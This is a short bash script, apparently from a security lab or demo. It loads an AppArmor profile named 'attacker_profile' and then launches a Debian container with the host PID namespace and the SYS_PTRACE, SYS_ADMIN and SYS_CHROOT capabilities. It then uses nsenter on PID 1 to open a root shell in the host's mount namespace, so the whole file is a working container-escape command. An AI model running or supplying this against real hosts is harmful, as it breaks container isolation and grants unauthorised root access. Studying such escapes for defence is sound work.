#!/bin/bash

./set_profile.sh
docker run --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN --cap-add SYS_CHROOT --rm -it debian:latest nsenter --target 1 --mount /bin/bash
